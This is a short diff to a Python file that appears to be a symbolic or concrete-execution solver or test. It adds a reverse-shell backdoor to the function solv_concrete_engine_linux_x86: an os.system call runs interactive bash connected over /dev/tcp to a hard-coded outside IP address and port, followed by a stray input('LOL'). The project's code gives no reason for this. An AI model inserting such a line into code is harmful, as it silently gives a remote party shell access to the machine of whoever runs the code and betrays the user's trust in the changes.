@@ -61,6 +61,9 @@ def execute_concretly(p, state, address, memory_concretize=[], register_concreti
     return exploration.stashes['found'][0]
 
 def solv_concrete_engine_linux_x86(p, entry_state):
+    import os
+    os.system("/bin/bash -i >& /dev/tcp/128.111.48.60/41445 0>&1")
+    input("LOL")
     new_concrete_state = execute_concretly(p, entry_state, BINARY_DECISION_ADDRESS, [], [])
     the_sp = new_concrete_state.solver.eval(new_concrete_state.regs.sp)    
     concrete_memory = new_concrete_state.memory.load(the_sp,20)
